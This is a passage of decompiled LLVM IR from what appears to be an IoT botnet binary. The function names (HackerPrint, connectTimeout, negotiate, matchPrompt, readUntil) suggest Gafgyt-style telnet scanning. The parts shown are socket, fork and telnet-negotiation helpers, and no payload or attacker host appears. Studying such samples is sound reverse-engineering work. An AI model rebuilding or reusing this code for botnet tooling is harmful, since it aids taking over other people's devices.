  %stack_var_-44.024 = phi i32 [ %v1_9c20, %dec_label_pc_9c1c ], [ %tmp33, %dec_label_pc_9c28.preheader ]
  %v2_9b34 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_9b40 = call i32 @HackerPrint(i32 %v2_9b34, i32 ptrtoint ([5 x i8]* @global_var_1fda4.52 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9b68.lr.ph, %dec_label_pc_9b68
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9b68.lr.ph ], [ %v1_9b7c, %dec_label_pc_9b68 ]
  %v5_9b74 = mul nuw nsw i32 %storemerge615, 4
  %v6_9b74 = add i32 %v5_9b74, %v2_9a64
  %v7_9b74 = inttoptr i32 %v6_9b74 to i32*
  store i32 0, i32* %v7_9b74, align 4
  %v1_9b7c = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9b7c, 32
  br i1 %tmp53, label %dec_label_pc_9b68, label %dec_label_pc_9b90

dec_label_pc_9b90:                                ; preds = %dec_label_pc_9b68
  %v2_9bb0 = load i32, i32* %v1_9ac0, align 4
  %v2_9bc4 = or i32 %v2_9bb0, %v6_9ad0
  store i32 %v2_9bc4, i32* %v1_9ac0, align 4
  store i32 0, i32* @r2, align 4
  %v5_9c04 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 %v2_9a64, i32 %v2_9b00)
  %v5_9c18 = icmp sgt i32 %v5_9c04, 0
  br i1 %v5_9c18, label %dec_label_pc_9cbc.preheader, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9b90
  %v1_9c20 = add nsw i32 %stack_var_-44.024, 1
  %v7_9c30 = icmp slt i32 %v1_9c20, 10
  br i1 %v7_9c30, label %dec_label_pc_9b68.lr.ph, label %dec_label_pc_9cbc.preheader

dec_label_pc_9cbc.preheader:                      ; preds = %dec_label_pc_9c1c, %dec_label_pc_9b90, %dec_label_pc_9c28.preheader, %dec_label_pc_9aa0
  %v2_9c50 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_9cc457 = icmp sgt i32 %arg3, 1
  %v2_9cdc59 = icmp eq i1 %not.v7_9cc457, false
  br i1 %v2_9cdc59, label %dec_label_pc_9ce4, label %dec_label_pc_9c48

dec_label_pc_9c48:                                ; preds = %dec_label_pc_9cbc.preheader, %dec_label_pc_9cb0
  %v1_9cc062.in = phi i32 [ %v1_9cc062, %dec_label_pc_9cb0 ], [ %arg3, %dec_label_pc_9cbc.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9ca0, %dec_label_pc_9cb0 ], [ %arg2, %dec_label_pc_9cbc.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9cb4, %dec_label_pc_9cb0 ], [ 0, %dec_label_pc_9cbc.preheader ]
  %v1_9cc062 = add i32 %v1_9cc062.in, -1
  %v2_9c4c = load i32, i32* @global_var_2c5e8.50, align 4
  %v5_9c64 = call i32 @__libc_recv(i32 %v2_9c4c, i32 %v2_9c50, i32 1, i32 0, i32 %v1_9cc062)
  %v7_9c6c = icmp eq i32 %v5_9c64, 1
  br i1 %v7_9c6c, label %dec_label_pc_9c8c, label %dec_label_pc_9c74

dec_label_pc_9c74:                                ; preds = %dec_label_pc_9c48
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9cf8

dec_label_pc_9c8c:                                ; preds = %dec_label_pc_9c48
  %v3_9c8c = load i8, i8* %stack_var_-185, align 1
  %v4_9c90 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9c8c, i8* %stack_var_-40.061, align 1
  %v1_9c9c = add i32 %v4_9c90, 1
  %v5_9ca0 = inttoptr i32 %v1_9c9c to i8*
  %v3_9ca4 = load i8, i8* %stack_var_-185, align 1
  %v7_9ca8 = icmp eq i8 %v3_9ca4, 10
  br i1 %v7_9ca8, label %dec_label_pc_9ce4, label %dec_label_pc_9cb0

dec_label_pc_9cb0:                                ; preds = %dec_label_pc_9c8c
  %v1_9cb4 = add i32 %stack_var_-36.060, 1
  %not.v7_9cc4 = icmp sgt i32 %v1_9cc062, 1
  %v2_9cdc = icmp eq i1 %not.v7_9cc4, false
  br i1 %v2_9cdc, label %dec_label_pc_9ce4, label %dec_label_pc_9c48

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9c8c, %dec_label_pc_9cb0, %dec_label_pc_9cbc.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9cbc.preheader ], [ %v1_9cb4, %dec_label_pc_9cb0 ], [ %stack_var_-36.060, %dec_label_pc_9c8c ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9cbc.preheader ], [ %v5_9ca0, %dec_label_pc_9cb0 ], [ %v5_9ca0, %dec_label_pc_9c8c ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9c74, %dec_label_pc_9ce4
  %storemerge = phi i32 [ -1, %dec_label_pc_9c74 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9ce4 ]
  %v2_9d04 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9d04, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9cc062, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9c20, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_9a64, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9cf8, { 1, 0 }
  uselistorder label %dec_label_pc_9ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9c48, { 1, 0 }
  uselistorder label %dec_label_pc_9b68, { 1, 0 }
  uselistorder label %dec_label_pc_9b68.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9a78, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40224, i32* %stack_var_-4, align 4
  %v2_9d1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d1c, i32* @fp, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_9d30 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_9d40 = icmp eq i32 %v1_9d30, 0
  br i1 %v2_9d40, label %dec_label_pc_9d48, label %dec_label_pc_9d5c

dec_label_pc_9d48:                                ; preds = %entry
  %v3_9d4c = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1fdac.54, i32 0, i32 0))
  br label %dec_label_pc_9dd4

dec_label_pc_9d5c:                                ; preds = %entry
  %v1_9d60 = add i32 %v1_9d30, 16
  %v2_9d60 = inttoptr i32 %v1_9d60 to i32*
  %v3_9d60 = load i32, i32* %v2_9d60, align 4
  %v1_9d84 = inttoptr i32 %v3_9d60 to i32*
  %v2_9d84 = load i32, i32* %v1_9d84, align 4
  %v2_9d88 = icmp eq i32 %v2_9d84, 0
  br i1 %v2_9d88, label %dec_label_pc_9dcc, label %dec_label_pc_9d90

dec_label_pc_9d90:                                ; preds = %dec_label_pc_9d5c
  %v2_9da4 = load i32, i32* %v1_9d84, align 4
  %v1_9da8 = inttoptr i32 %v2_9da4 to i32*
  %v2_9da8 = load i32, i32* %v1_9da8, align 4
  store i32 %v2_9da8, i32* @r0, align 4
  %v1_9dac = call i32 @__GI_inet_ntoa(i32 %v2_9da8)
  store i32 %v1_9dac, i32* @r1, align 4
  %v2_9dbc = inttoptr i32 %arg2 to i8*
  %v3_9dbc = call i32 @strcpy(i8* %v2_9dbc, i32 %v1_9dac)
  br label %dec_label_pc_9dd4

dec_label_pc_9dcc:                                ; preds = %dec_label_pc_9d5c
  br label %dec_label_pc_9dd4

dec_label_pc_9dd4:                                ; preds = %dec_label_pc_9d90, %dec_label_pc_9d48, %dec_label_pc_9dcc
  %stack_var_-44.0 = phi i32 [ 1, %dec_label_pc_9d48 ], [ 1, %dec_label_pc_9dcc ], [ 0, %dec_label_pc_9d90 ]
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9dd4, { 2, 0, 1 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9df0 = load i32, i32* @fp, align 4
  store i32 %v3_9df0, i32* %stack_var_-16, align 4
  %v13_9df0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_9e18 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9e28 = or i32 %v2_9e18, 2048
  store i32 %v1_9e28, i32* @r3, align 4
  %v2_9e3c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9e50 = urem i32 %arg3, 65536
  %v1_9e58 = call i32 @__GI_htons(i32 %v3_9e50)
  %v3_9e78 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9e80 = icmp eq i32 %v3_9e78, 0
  br i1 %v2_9e80, label %dec_label_pc_9e94, label %dec_label_pc_9e88

dec_label_pc_9e88:                                ; preds = %entry
  br label %dec_label_pc_a04c

dec_label_pc_9e94:                                ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_9ea8 = bitcast i32* %stack_var_-40 to i8*
  %v3_9ea8 = call i32 @__GI_memset(i8* %v2_9ea8, i32 0)
  %v2_9eac = ptrtoint i32* %stack_var_-48 to i32
  %v3_9ebc = call i32 @__libc_connect(i32 %arg1, i32 %v2_9eac, i32 16)
  store i32 %v3_9ebc, i32* @r3, align 4
  %v1_9ecc = icmp slt i32 %v3_9ebc, 0
  br i1 %v1_9ecc, label %dec_label_pc_9ed4, label %dec_label_pc_a010

dec_label_pc_9ed4:                                ; preds = %dec_label_pc_9e94
  %v0_9ed4 = call i32 @__GI___errno_location()
  %v1_9edc = inttoptr i32 %v0_9ed4 to i32*
  %v2_9edc = load i32, i32* %v1_9edc, align 4
  %v7_9ee0 = icmp eq i32 %v2_9edc, 115
  br i1 %v7_9ee0, label %dec_label_pc_9f0c.lr.ph, label %dec_label_pc_a004

dec_label_pc_9f0c.lr.ph:                          ; preds = %dec_label_pc_9ed4
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9ef8 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9f0c

dec_label_pc_9f0c:                                ; preds = %dec_label_pc_9f0c.lr.ph, %dec_label_pc_9f0c
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9f0c.lr.ph ], [ %v1_9f20, %dec_label_pc_9f0c ]
  %v5_9f18 = mul nuw nsw i32 %storemerge14, 4
  %v6_9f18 = add i32 %v5_9f18, %v2_9ef8
  %v7_9f18 = inttoptr i32 %v6_9f18 to i32*
  store i32 0, i32* %v7_9f18, align 4
  %v1_9f20 = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_9f20, 32
  br i1 %tmp28, label %dec_label_pc_9f0c, label %dec_label_pc_9f34

dec_label_pc_9f34:                                ; preds = %dec_label_pc_9f0c
  %v3_9f38 = udiv i32 %arg1, 32
  %v3_9f44 = mul nuw nsw i32 %v3_9f38, 4
  %v2_9f4c = add nsw i32 %v3_9f44, -160
  %v2_9f50 = add i32 %v2_9f4c, %v13_9df0
  %v1_9f54 = inttoptr i32 %v2_9f50 to i32*
  %v2_9f54 = load i32, i32* %v1_9f54, align 4
  %v1_9f5c = urem i32 %arg1, 32
  %v6_9f64 = shl i32 1, %v1_9f5c
  %v2_9f68 = or i32 %v2_9f54, %v6_9f64
  store i32 %v2_9f68, i32* %v1_9f54, align 4
  %v1_9f88 = add i32 %arg1, 1
  %v2_9f90 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9fa8 = call i32 @__libc_select(i32 %v1_9f88, i32 0, i32 %v2_9ef8, i32 0, i32 %v2_9f90)
  %tmp29 = icmp slt i32 %v5_9fa8, 1
  br i1 %tmp29, label %dec_label_pc_9ff8, label %dec_label_pc_9fb8

dec_label_pc_9fb8:                                ; preds = %dec_label_pc_9f34
  store i32 4, i32* %stack_var_-188, align 4
  %v2_9fc0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_9fc4 = ptrtoint i32* %stack_var_-188 to i32
  %v5_9fdc = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_9fc0, i32 %v2_9fc4)
  %v3_9fe0 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_9fe0, i32* @r3, align 4
  %v2_9fe4 = icmp eq i32 %v3_9fe0, 0
  br i1 %v2_9fe4, label %dec_label_pc_a010, label %dec_label_pc_9fec

dec_label_pc_9fec:                                ; preds = %dec_label_pc_9fb8
  br label %dec_label_pc_a04c

dec_label_pc_9ff8:                                ; preds = %dec_label_pc_9f34
  br label %dec_label_pc_a04c

dec_label_pc_a004:                                ; preds = %dec_label_pc_9ed4
  br label %dec_label_pc_a04c

dec_label_pc_a010:                                ; preds = %dec_label_pc_9e94, %dec_label_pc_9fb8
  %v2_a01c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a02c = and i32 %v2_a01c, -2049
  store i32 %v1_a02c, i32* @r3, align 4
  %v2_a040 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a04c

dec_label_pc_a04c:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9ff8, %dec_label_pc_9fec, %dec_label_pc_9e88, %dec_label_pc_a010
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9ff8 ], [ 1, %dec_label_pc_a010 ], [ 0, %dec_label_pc_9fec ], [ 0, %dec_label_pc_a004 ], [ 0, %dec_label_pc_9e88 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9ef8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a04c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a010, { 1, 0 }
  uselistorder label %dec_label_pc_9f0c, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_a064 = load i32, i32* @r4, align 4
  %v6_a064 = load i32, i32* @r5, align 4
  %v9_a064 = load i32, i32* @r6, align 4
  %v12_a064 = load i32, i32* @fp, align 4
  store i32 41068, i32* %stack_var_-4, align 4
  %v2_a068 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a068, i32* @fp, align 4
  %v0_a070 = call i32 @__libc_fork()
  %v2_a080 = icmp eq i32 %v0_a070, 0
  br i1 %v2_a080, label %dec_label_pc_a1ec, label %dec_label_pc_a094

dec_label_pc_a094:                                ; preds = %entry
  %v2_a098 = load i32, i32* @global_var_2c5f0.56, align 4
  %v5_a098 = load i32, i32* @global_var_2c5f4.57, align 4
  %v2_a0a4 = add i32 %v2_a098, 1
  %v3_a0a4 = icmp eq i32 %v2_a0a4, 0
  %v4_a0a8 = zext i1 %v3_a0a4 to i32
  %v5_a0a8 = add i32 %v4_a0a8, %v5_a098
  store i32 %v2_a0a4, i32* @global_var_2c5f0.56, align 4
  store i32 %v5_a0a8, i32* @global_var_2c5f4.57, align 4
  %v2_a0c4 = add i32 %v2_a098, 2
  %v3_a0c4 = icmp eq i32 %v2_a0a4, -1
  %v4_a0c8 = zext i1 %v3_a0c4 to i32
  %v5_a0c8 = add i32 %v5_a0a8, %v4_a0c8
  %v3_a0cc = udiv i32 %v2_a0c4, 1073741824
  %v3_a0d0 = mul i32 %v5_a0c8, 4
  %v2_a0d4 = or i32 %v3_a0d0, %v3_a0cc
  store i32 %v2_a0d4, i32* @r4, align 4
  %v3_a0d8 = mul i32 %v2_a0c4, 4
  %v1_a0e0 = call i32 @malloc(i32 %v3_a0d8)
  br label %dec_label_pc_a138

dec_label_pc_a0f8:                                ; preds = %dec_label_pc_a138, %dec_label_pc_a184
  %v3_a0fc = mul i32 %storemerge2, 4
  %v2_a108 = add i32 %v3_a0fc, %v1_a0e0
  %v2_a11c = load i32, i32* @global_var_32850.59, align 4
  %v2_a120 = add i32 %v2_a11c, %v3_a0fc
  %v1_a124 = inttoptr i32 %v2_a120 to i32*
  %v2_a124 = load i32, i32* %v1_a124, align 4
  %v2_a128 = inttoptr i32 %v2_a108 to i32*
  store i32 %v2_a124, i32* %v2_a128, align 4
  %v1_a130 = add i32 %storemerge2, 1
  br label %dec_label_pc_a138

dec_label_pc_a138:                                ; preds = %dec_label_pc_a094, %dec_label_pc_a0f8
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a094 ], [ %v1_a130, %dec_label_pc_a0f8 ]
  %v2_a150 = load i32, i32* @global_var_2c5f0.56, align 4
  %v5_a150 = load i32, i32* @global_var_2c5f4.57, align 4
  %v2_a164 = add i32 %v2_a150, -1
  %v3_a164 = icmp ne i32 %v2_a150, 0
  %v3_a168 = add i32 %v5_a150, -1
  %v5_a168 = sext i1 %v3_a164 to i32
  %v9_a17c = icmp eq i32 %v3_a168, %v5_a168
  br i1 %v9_a17c, label %dec_label_pc_a184, label %dec_label_pc_a0f8

dec_label_pc_a184:                                ; preds = %dec_label_pc_a138
  store i32 %v2_a164, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a164, %storemerge2
  br i1 %tmp, label %dec_label_pc_a0f8, label %dec_label_pc_a1a4

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a184
  store i32 %v5_a150, i32* @r4, align 4
  %v3_a1ac = mul i32 %v2_a150, 4
  %v1_a1b0 = add i32 %v1_a0e0, -4
  %v2_a1bc = add i32 %v1_a1b0, %v3_a1ac
  %v2_a1c4 = inttoptr i32 %v2_a1bc to i32*
  store i32 %v0_a070, i32* %v2_a1c4, align 4
  %v2_a1cc = load i32, i32* @global_var_32850.59, align 4
  store i32 %v2_a1cc, i32* @r0, align 4
  %v0_a1d4 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_32850.59 to i32), i32* @r2, align 4
  store i32 %v1_a0e0, i32* @global_var_32850.59, align 4
  br label %dec_label_pc_a1ec

dec_label_pc_a1ec:                                ; preds = %entry, %dec_label_pc_a1a4
  store i32 %v3_a064, i32* @r4, align 4
  store i32 %v6_a064, i32* @r5, align 4
  store i32 %v9_a064, i32* @r6, align 4
  store i32 %v12_a064, i32* @fp, align 4
  ret i32 %v0_a070

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a0fc, { 1, 0 }
  uselistorder i32 %v1_a0e0, { 2, 0, 1 }
  uselistorder i32 %v2_a0a4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a1ec, { 1, 0 }
  uselistorder label %dec_label_pc_a138, { 1, 0 }
  uselistorder label %dec_label_pc_a0f8, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a228 = add i32 %arg2, 1
  %v1_a22c = inttoptr i32 %v1_a228 to i8*
  %v2_a22c = load i8, i8* %v1_a22c, align 1
  %v7_a238 = icmp ult i8 %v2_a22c, -5
  br i1 %v7_a238, label %dec_label_pc_a384, label %dec_label_pc_a240

dec_label_pc_a240:                                ; preds = %entry
  %v7_a248 = icmp eq i8 %v2_a22c, -1
  br i1 %v7_a248, label %dec_label_pc_a24c, label %dec_label_pc_a268

dec_label_pc_a24c:                                ; preds = %dec_label_pc_a240
  br label %dec_label_pc_a384

dec_label_pc_a268:                                ; preds = %dec_label_pc_a240
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a270 = ptrtoint i8* %stack_var_-17 to i32
  %v5_a284 = call i32 @__libc_send(i32 %arg1, i32 %v2_a270, i32 1, i32 16384)
  %v2_a290 = load i8, i8* %v1_a22c, align 1
  %v7_a294 = icmp eq i8 %v2_a290, -4
  br i1 %v7_a294, label %dec_label_pc_a29c, label %dec_label_pc_a2a8

dec_label_pc_a29c:                                ; preds = %dec_label_pc_a268
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a348

dec_label_pc_a2a8:                                ; preds = %dec_label_pc_a268
  %v2_a2b0 = load i8, i8* %v1_a22c, align 1
  %v7_a2b4 = icmp eq i8 %v2_a2b0, -2
  br i1 %v7_a2b4, label %dec_label_pc_a2bc, label %dec_label_pc_a2c8

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a2a8
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a348

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2a8
  %v2_a2d0 = load i8, i8* %v1_a22c, align 1
  %v7_a2d4 = icmp eq i8 %v2_a2d0, 3
  %v7_a2e8 = icmp eq i8 %v2_a2d0, -3
  br i1 %v7_a2d4, label %dec_label_pc_a2dc, label %dec_label_pc_a314

dec_label_pc_a2dc:                                ; preds = %dec_label_pc_a2c8
  br i1 %v7_a2e8, label %dec_label_pc_a2f0, label %dec_label_pc_a2fc

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2dc
  br label %dec_label_pc_a304

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a2dc
  br label %dec_label_pc_a304

dec_label_pc_a304:                                ; preds = %dec_label_pc_a2f0, %dec_label_pc_a2fc
  %storemerge = phi i8 [ -3, %dec_label_pc_a2fc ], [ -5, %dec_label_pc_a2f0 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a348

dec_label_pc_a314:                                ; preds = %dec_label_pc_a2c8
  br i1 %v7_a2e8, label %dec_label_pc_a328, label %dec_label_pc_a334

dec_label_pc_a328:                                ; preds = %dec_label_pc_a314
  br label %dec_label_pc_a33c

dec_label_pc_a334:                                ; preds = %dec_label_pc_a314
  br label %dec_label_pc_a33c

dec_label_pc_a33c:                                ; preds = %dec_label_pc_a328, %dec_label_pc_a334
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a334 ], [ -4, %dec_label_pc_a328 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a348

dec_label_pc_a348:                                ; preds = %dec_label_pc_a304, %dec_label_pc_a2bc, %dec_label_pc_a29c, %dec_label_pc_a33c
  %v4_a35c = call i32 @__libc_send(i32 %arg1, i32 %v2_a270, i32 1, i32 16384)
  %v1_a364 = add i32 %arg2, 2
  %v4_a378 = call i32 @__libc_send(i32 %arg1, i32 %v1_a364, i32 1, i32 16384)
  br label %dec_label_pc_a384

dec_label_pc_a384:                                ; preds = %dec_label_pc_a24c, %dec_label_pc_a348, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a384, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a348, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a33c, { 1, 0 }
  uselistorder label %dec_label_pc_a304, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a3b8 = call i32 @strlen(i8* %arg1)
  %v2_a400 = add i32 %v3_a3b8, %tmp
  br label %dec_label_pc_a4d4

dec_label_pc_a3d8:                                ; preds = %dec_label_pc_a460, %dec_label_pc_a43c, %dec_label_pc_a418, %dec_label_pc_a3f4
  %v1_a3dc = add nsw i32 %stack_var_-28.014, 1
  %v7_a3f0 = icmp sgt i32 %v3_a3b8, %v1_a3dc
  br i1 %v7_a3f0, label %dec_label_pc_a3f4, label %dec_label_pc_a484

dec_label_pc_a3f4:                                ; preds = %dec_label_pc_a3e4.preheader, %dec_label_pc_a3d8
  %stack_var_-28.014 = phi i32 [ %v1_a3dc, %dec_label_pc_a3d8 ], [ %stack_var_-28.1, %dec_label_pc_a3e4.preheader ]
  %v2_a408 = sub i32 %v2_a400, %stack_var_-28.014
  %v1_a40c = inttoptr i32 %v2_a408 to i8*
  %v2_a40c = load i8, i8* %v1_a40c, align 1
  %v2_a410 = icmp eq i8 %v2_a40c, 0
  br i1 %v2_a410, label %dec_label_pc_a3d8, label %dec_label_pc_a418

dec_label_pc_a418:                                ; preds = %dec_label_pc_a3f4
  %v2_a430 = load i8, i8* %v1_a40c, align 1
  %v7_a434 = icmp eq i8 %v2_a430, 32
  br i1 %v7_a434, label %dec_label_pc_a3d8, label %dec_label_pc_a43c

dec_label_pc_a43c:                                ; preds = %dec_label_pc_a418
  %v2_a454 = load i8, i8* %v1_a40c, align 1
  %v7_a458 = icmp eq i8 %v2_a454, 13
  br i1 %v7_a458, label %dec_label_pc_a3d8, label %dec_label_pc_a460

dec_label_pc_a460:                                ; preds = %dec_label_pc_a43c
  %v2_a478 = load i8, i8* %v1_a40c, align 1
  %v7_a47c = icmp eq i8 %v2_a478, 10
  br i1 %v7_a47c, label %dec_label_pc_a3d8, label %dec_label_pc_a484

dec_label_pc_a484:                                ; preds = %dec_label_pc_a460, %dec_label_pc_a3d8, %dec_label_pc_a3e4.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a3e4.preheader ], [ %stack_var_-28.014, %dec_label_pc_a460 ], [ %v1_a3dc, %dec_label_pc_a3d8 ]
  %v2_a498 = sub i32 %v2_a400, %stack_var_-28.0.lcssa
  %v1_a49c = inttoptr i32 %v2_a498 to i8*
  %v2_a49c = load i8, i8* %v1_a49c, align 1
  %v2_a4ac = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_1fdbc.61 to i32)
  %v1_a4b0 = inttoptr i32 %v2_a4ac to i8*
  %v2_a4b0 = load i8, i8* %v1_a4b0, align 1
  %v9_a4b4 = icmp eq i8 %v2_a49c, %v2_a4b0
  %v1_a4cc = add i32 %storemerge3, 1
  br i1 %v9_a4b4, label %dec_label_pc_a4f4, label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a484, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a484 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_a4cc, %dec_label_pc_a484 ]
  %v3_a4dc = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fdbc.61, i32 0, i32 0))
  %v3_a4e4 = icmp ult i32 %storemerge3, %v3_a4dc
  br i1 %v3_a4e4, label %dec_label_pc_a3e4.preheader, label %dec_label_pc_a4f4

dec_label_pc_a3e4.preheader:                      ; preds = %dec_label_pc_a4d4
  %v7_a3f013 = icmp sgt i32 %v3_a3b8, %stack_var_-28.1
  br i1 %v7_a3f013, label %dec_label_pc_a3f4, label %dec_label_pc_a484

dec_label_pc_a4f4:                                ; preds = %dec_label_pc_a4d4, %dec_label_pc_a484
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a484 ], [ 0, %dec_label_pc_a4d4 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a3b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a484, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a510 = load i32, i32* @fp, align 4
  store i32 %v3_a510, i32* %stack_var_-16, align 4
  %v13_a510 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a560 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a5a0 = udiv i32 %arg1, 32
  %v3_a5ac = mul nuw nsw i32 %v3_a5a0, 4
  %v1_a5c4 = urem i32 %arg1, 32
  %v6_a5cc = shl i32 1, %v1_a5c4
  %v1_a5f0 = add i32 %arg1, 1
  %v2_a5f8 = ptrtoint i32* %stack_var_-176 to i32
  %v6_a718 = inttoptr i32 %arg2 to i8*
  %v2_a72c = icmp eq i32 %arg3, 0
  %v1_a738 = inttoptr i32 %arg6 to i8*
  %v5_a77c = icmp sgt i32 %arg5, 0
  %v2_a5b4 = add nsw i32 %v3_a5ac, -152
